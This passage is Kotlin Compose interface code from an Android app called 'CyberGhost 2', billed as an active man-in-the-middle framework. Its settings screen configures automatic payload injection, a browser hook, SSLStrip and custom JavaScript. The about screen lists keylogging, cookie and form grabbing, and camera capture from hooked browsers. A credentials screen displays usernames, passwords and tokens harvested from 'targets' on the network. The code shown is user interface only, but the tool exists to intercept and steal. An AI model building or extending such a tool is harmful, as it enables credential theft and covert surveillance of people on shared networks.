                StatCard("Total Packets", "${stats.totalPackets.get()}", CgAmber, Icons.Filled.SwapVert, Modifier.weight(1f))
                StatCard("Total Traffic", formatBytes(stats.totalBytes.get()), CgBlue, Icons.Filled.DataUsage, Modifier.weight(1f))
            }
        }

        // bandwidth chart (simple text-based for now)
        if (bwHistory.isNotEmpty()) {
            item {
                Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                    Column(Modifier.padding(14.dp)) {
                        Text("Bandwidth (last 60s)", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                        Spacer(Modifier.height(8.dp))
                        val maxBw = bwHistory.maxOfOrNull { it.bytesPerSecond } ?: 1
                        Row(Modifier.fillMaxWidth().height(60.dp), horizontalArrangement = Arrangement.spacedBy(1.dp), verticalAlignment = Alignment.Bottom) {
                            bwHistory.takeLast(30).forEach { point ->
                                val height = if (maxBw > 0) (point.bytesPerSecond.toFloat() / maxBw) * 60 else 0f
                                Box(Modifier.weight(1f).height(height.dp).clip(RoundedCornerShape(topStart = 2.dp, topEnd = 2.dp)).background(CgCyan.copy(0.7f)))
                            }
                        }
                        Spacer(Modifier.height(4.dp))
                        Text("Current: ${formatBytes(bwHistory.lastOrNull()?.bytesPerSecond ?: 0)}/s", fontSize = 10.sp, color = CgCyan)
                    }
                }
            }
        }

        // top domains
        item { Text("Top Domains", fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgGray) }
        items(topDomains) { domain ->
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(8.dp)) {
                Row(Modifier.padding(12.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                    Column(Modifier.weight(1f)) {
                        Text(domain.domain, fontSize = 12.sp, color = CgWhite, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        Text("${domain.requestCount} requests · ${formatBytes(domain.bytesTotal)}", fontSize = 10.sp, color = CgGray)
                    }
                    Text("${domain.requestCount}", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = CgAmber)
                }
            }
        }
    }
}

// ============================
// SETTINGS SCREEN
// ============================
@Composable
fun SettingsScreen(
    mode: InterceptMode, onModeChange: (InterceptMode) -> Unit,
    config: InjectionConfig, onConfigUpdate: (InjectionConfig) -> Unit,
    profiles: List<String>, onSaveProfile: (String) -> Unit, onLoadProfile: (String) -> Unit, onDeleteProfile: (String) -> Unit,
    onExportCa: () -> Unit, navigateTo: (Screen) -> Unit
) {
    var profileName by remember { mutableStateOf(TextFieldValue("")) }

    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        item { Text("Settings", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite) }

        // intercept mode
        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(14.dp)) {
                    Text("Intercept Mode", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                    Spacer(Modifier.height(8.dp))
                    InterceptMode.entries.forEach { m ->
                        Row(Modifier.fillMaxWidth().clickable { onModeChange(m) }.padding(vertical = 6.dp), verticalAlignment = Alignment.CenterVertically) {
                            RadioButton(selected = mode == m, onClick = { onModeChange(m) }, colors = RadioButtonDefaults.colors(selectedColor = CgGreen))
                            Spacer(Modifier.width(8.dp))
                            Column {
                                Text(m.name, fontSize = 12.sp, color = CgWhite)
                                Text(when (m) {
                                    InterceptMode.PASSTHROUGH -> "Log traffic without modification"
                                    InterceptMode.AUTO_INJECT -> "Automatically inject payloads into responses"
                                    InterceptMode.MANUAL -> "Pause and edit each packet before forwarding"
                                }, fontSize = 10.sp, color = CgGray)
                            }
                        }
                    }
                }
            }
        }

        // injection config
        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(14.dp)) {
                    Text("Injection Config", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                    Spacer(Modifier.height(8.dp))
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                        Text("Browser Hook", fontSize = 12.sp, color = CgWhite)
                        Switch(checked = config.hookEnabled, onCheckedChange = { onConfigUpdate(config.copy(hookEnabled = it)) },
                            colors = SwitchDefaults.colors(checkedTrackColor = CgGreen, uncheckedTrackColor = CgGray))
                    }
                    SettingsField("Audio URL", config.audioUrl ?: "") { onConfigUpdate(config.copy(audioUrl = it.ifBlank { null })) }
                    SettingsField("Video URL", config.videoUrl ?: "") { onConfigUpdate(config.copy(videoUrl = it.ifBlank { null })) }
                    SettingsField("Document URL", config.documentUrl ?: "") { onConfigUpdate(config.copy(documentUrl = it.ifBlank { null })) }
                    SettingsField("Redirect URL", config.redirectUrl ?: "") { onConfigUpdate(config.copy(redirectUrl = it.ifBlank { null })) }
                    ToggleRow("SSLStrip (downgrade HTTPS links)", config.sslStripEnabled) { onConfigUpdate(config.copy(sslStripEnabled = it)) }
                    SettingsField("Custom JS", config.customJs ?: "") { onConfigUpdate(config.copy(customJs = it.ifBlank { null })) }
                }
            }
        }

        // profiles
        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(14.dp)) {
                    Text("Profiles", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                    Spacer(Modifier.height(8.dp))
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        OutlinedTextField(value = profileName, onValueChange = { profileName = it }, placeholder = { Text("Profile name", fontSize = 11.sp) },
                            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite), modifier = Modifier.weight(1f).height(42.dp),
                            singleLine = true, shape = RoundedCornerShape(8.dp),
                            colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                        Spacer(Modifier.width(6.dp))
                        Button(onClick = { if (profileName.text.isNotBlank()) { onSaveProfile(profileName.text); profileName = TextFieldValue("") } },
                            colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)), shape = RoundedCornerShape(8.dp), contentPadding = PaddingValues(horizontal = 12.dp)) {
                            Text("Save", fontSize = 11.sp, color = CgGreen)
                        }
                    }
                    Spacer(Modifier.height(6.dp))
                    profiles.forEach { name ->
                        Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                            Text(name, fontSize = 12.sp, color = CgWhite, modifier = Modifier.weight(1f))
                            Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                                TextButton(onClick = { onLoadProfile(name) }) { Text("Load", fontSize = 10.sp, color = CgCyan) }
                                TextButton(onClick = { onDeleteProfile(name) }) { Text("Delete", fontSize = 10.sp, color = CgRed) }
                            }
                        }
                    }
                }
            }
        }

        // actions
        item {
            Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
                    Text("Tools", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                    Spacer(Modifier.height(4.dp))
                    SettingsRow("Export CA Certificate", Icons.Filled.Security, CgAmber, onExportCa)
                    SettingsRow("Network Map", Icons.Filled.Radar, CgCyan) { navigateTo(Screen.NETWORK) }
                    SettingsRow("Traffic Stats", Icons.Filled.BarChart, CgBlue) { navigateTo(Screen.STATS) }
                    SettingsRow("About", Icons.Filled.Info, CgDimGreen) { navigateTo(Screen.ABOUT) }
                }
            }
        }
    }
}

@Composable
fun SettingsField(label: String, value: String, onChange: (String) -> Unit) {
    var text by remember { mutableStateOf(TextFieldValue(value)) }
    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) }, label = { Text(label, fontSize = 10.sp) },
        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite), modifier = Modifier.fillMaxWidth().padding(top = 4.dp),
        singleLine = true, shape = RoundedCornerShape(8.dp),
        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
}

@Composable
fun SettingsRow(label: String, icon: ImageVector, color: Color, onClick: () -> Unit) {
    Row(Modifier.fillMaxWidth().clickable(onClick = onClick).padding(vertical = 10.dp), verticalAlignment = Alignment.CenterVertically) {
        Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(18.dp))
        Spacer(Modifier.width(12.dp))
        Text(label, fontSize = 13.sp, color = CgWhite)
        Spacer(Modifier.weight(1f))
        Icon(Icons.Filled.ChevronRight, contentDescription = null, tint = CgGray, modifier = Modifier.size(16.dp))
    }
}

// ============================
// ABOUT SCREEN
// ============================
@Composable
fun AboutScreen() {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(12.dp)) {
        item { Spacer(Modifier.height(20.dp)) }
        item {
            Box(Modifier.size(80.dp).clip(RoundedCornerShape(20.dp)).background(CgGreen.copy(0.1f)), contentAlignment = Alignment.Center) {
                Text("CG", fontSize = 28.sp, fontWeight = FontWeight.Bold, color = CgGreen)
            }
        }
        item { Text("CyberGhost 2", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = CgWhite) }
        item { Text("Active MITM Framework for Android", fontSize = 13.sp, color = CgGray) }
        item { Text("v2.0", fontSize = 12.sp, color = CgGreen) }

        item { HorizontalDivider(color = CgGray.copy(0.2f), modifier = Modifier.padding(vertical = 8.dp)) }

        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Text("Developed by", fontSize = 11.sp, color = CgGray)
                    Spacer(Modifier.height(4.dp))
                    Text("Nitin Shukla", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgGreen)
                    Spacer(Modifier.height(8.dp))
                    Text("github.com/n0obcoders/cyberghost", fontSize = 12.sp, color = CgCyan)
                }
            }
        }

        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(16.dp)) {
                    Text("About CyberGhost 2", fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                    Spacer(Modifier.height(8.dp))
                    Text("CyberGhost 2 is an advanced man-in-the-middle framework for Android. It turns your device into a WiFi gateway that can transparently intercept, inspect, modify, and inject content into network traffic from connected devices.",
                        fontSize = 12.sp, color = CgGray, lineHeight = 18.sp)
                    Spacer(Modifier.height(12.dp))
                    Text("Features", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
                    Spacer(Modifier.height(6.dp))
                    FeatureItem("Transparent HTTP/HTTPS interception via DNS redirect")
                    FeatureItem("Real-time packet inspection with search and filtering")
                    FeatureItem("Content injection — JavaScript, HTML, media payloads")
                    FeatureItem("Browser hook agent with remote JS execution")
                    FeatureItem("Keylogging, cookie/storage extraction, form grabbing")
                    FeatureItem("Screenshot and camera capture from hooked browsers")
                    FeatureItem("Network mapping with MAC vendor identification")
                    FeatureItem("Live traffic statistics and bandwidth monitoring")
                    FeatureItem("SSL certificate inspection")
                    FeatureItem("Capture export to HAR format")
                    FeatureItem("Injection profile management")
                    FeatureItem("No root required")
                }
            }
        }

        item {
            Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCyan.copy(0.08f)), shape = RoundedCornerShape(12.dp)) {
                Column(Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Text("Portfolio", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgCyan)
                    Spacer(Modifier.height(4.dp))
                    Text("n0obcoders.github.io/portfoli0", fontSize = 12.sp, color = CgWhite)
                    Spacer(Modifier.height(4.dp))
                    Text("Tap the link above to visit", fontSize = 10.sp, color = CgGray)
                }
            }
        }

        item { Spacer(Modifier.height(20.dp)) }
    }
}

@Composable
fun FeatureItem(text: String) {
    Row(Modifier.padding(vertical = 2.dp)) {
        Text("•", fontSize = 12.sp, color = CgGreen)
        Spacer(Modifier.width(8.dp))
        Text(text, fontSize = 11.sp, color = CgGray, lineHeight = 16.sp)
    }
}

// ============================
// UTILITY
// ============================
fun formatBytes(bytes: Long): String {
    return when {
        bytes < 1024 -> "$bytes B"
        bytes < 1024 * 1024 -> "${bytes / 1024} KB"
        bytes < 1024 * 1024 * 1024 -> "${"%.1f".format(bytes / (1024.0 * 1024.0))} MB"
        else -> "${"%.2f".format(bytes / (1024.0 * 1024.0 * 1024.0))} GB"
    }
}

// ============================
// CREDENTIALS SCREEN
// ============================
@Composable
fun CredentialsScreen(credentials: List<HarvestedCredential>, onClear: () -> Unit) {
    Column(Modifier.fillMaxSize()) {
        Row(Modifier.fillMaxWidth().padding(16.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Column {
                Text("Credentials", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                Text("${credentials.size} captured", fontSize = 12.sp, color = CgRed)
            }
            if (credentials.isNotEmpty()) {
                TextButton(onClick = onClear) { Text("Clear All", fontSize = 12.sp, color = CgRed) }
            }
        }
        if (credentials.isEmpty()) {
            Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(Icons.Filled.Lock, contentDescription = null, tint = CgGray, modifier = Modifier.size(48.dp))
                    Spacer(Modifier.height(12.dp))
                    Text("No credentials captured yet", fontSize = 14.sp, color = CgGray)
                    Text("Start capture and wait for targets to log in", fontSize = 12.sp, color = CgGray.copy(0.6f))
                }
            }
        } else {
            LazyColumn(Modifier.fillMaxSize().padding(horizontal = 16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                items(credentials.reversed()) { cred ->
                    CredentialCard(cred)
                }
            }
        }
    }
}

@Composable
fun CredentialCard(cred: HarvestedCredential) {
    val typeColor = when (cred.type) {
        CredentialType.FORM_LOGIN -> CgRed
        CredentialType.BASIC_AUTH -> CgAmber
        CredentialType.BEARER_TOKEN -> CgCyan
        CredentialType.JSON_LOGIN -> CgMagenta
        CredentialType.API_KEY -> CgBlue
        CredentialType.COOKIE_SESSION -> CgDimGreen
    }
    var expanded by remember { mutableStateOf(false) }

    Card(Modifier.fillMaxWidth().clickable { expanded = !expanded },
        colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp),
        border = BorderStroke(1.dp, typeColor.copy(0.3f))) {
        Column(Modifier.padding(14.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(8.dp).clip(CircleShape).background(typeColor))
                    Spacer(Modifier.width(8.dp))
                    Text(cred.host, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgWhite, maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
                }
                Badge(containerColor = typeColor.copy(0.2f)) {
                    Text(cred.type.name.replace("_", " "), fontSize = 8.sp, color = typeColor, modifier = Modifier.padding(horizontal = 4.dp))
                }
            }
            Spacer(Modifier.height(8.dp))
            cred.username?.let {
                CredRow("Username", it, CgCyan)
            }
            cred.password?.let {
                CredRow("Password", it, CgRed)
            }
            cred.token?.let {
                CredRow("Token", it.take(40) + if (it.length > 40) "..." else "", CgAmber)
            }
            Text(cred.path, fontSize = 9.sp, color = CgGray, maxLines = 1, overflow = TextOverflow.Ellipsis)

            if (expanded && cred.rawFields.isNotEmpty()) {
                Spacer(Modifier.height(8.dp))
                HorizontalDivider(color = CgGray.copy(0.2f))
                Spacer(Modifier.height(6.dp))
                Text("Raw Fields", fontSize = 10.sp, color = CgGray, fontWeight = FontWeight.SemiBold)
                cred.rawFields.entries.forEach { (k, v) ->
                    Text("$k: $v", fontSize = 9.sp, color = CgGray, fontFamily = FontFamily.Monospace, maxLines = 1, overflow = TextOverflow.Ellipsis)
                }
                Spacer(Modifier.height(4.dp))
                Text("Source: ${cred.sourceIp} · ${cred.protocol}", fontSize = 9.sp, color = CgGray.copy(0.6f))
                Text(cred.notes, fontSize = 9.sp, color = CgGray.copy(0.6f))
            }
        }
    }
}

@Composable
fun CredRow(label: String, value: String, color: Color) {
    Row(Modifier.padding(vertical = 2.dp)) {
        Text("$label: ", fontSize = 11.sp, color = CgGray, fontWeight = FontWeight.Medium)
        Text(value, fontSize = 11.sp, color = color, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis)
    }
}
